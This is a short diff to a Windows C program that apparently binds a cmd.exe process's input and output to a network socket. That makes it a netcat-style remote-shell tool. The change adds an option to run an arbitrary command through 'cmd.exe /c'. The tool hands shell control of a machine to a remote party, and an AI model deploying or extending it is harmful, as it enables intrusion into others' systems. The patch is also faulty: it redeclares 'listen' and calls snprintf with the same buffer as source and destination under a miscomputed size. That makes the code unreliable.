@@ -101,6 +101,10 @@ int main(int argc, char* argv[]) {
     int listen = 0;
     char* host = NULL;
     int port = -1;
+    char cmd[1024] = "cmd.exe /q";
+
+    int listen = 0;
+    char* C_arg = NULL;
 
     // parse command-line arguments ...
     for (int i = 1; i < argc; i++) {
@@ -174,7 +178,11 @@ int main(int argc, char* argv[]) {
     startupInfo.hStdOutput = (HANDLE)sock;
     startupInfo.hStdError = (HANDLE)sock;
 
-    if (!CreateProcessA(NULL, "cmd.exe /q", NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo)) {
+    if (C_arg != NULL) {
+        snprintf(cmd, sizeof(cmd) - strlen(cmd), "%s /c \"%s\"", cmd, C_arg);
+    }
+
+    if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo)) {
         printf("Failed to create cmd.exe process.\n");
         closesocket(sock);
         WSACleanup();
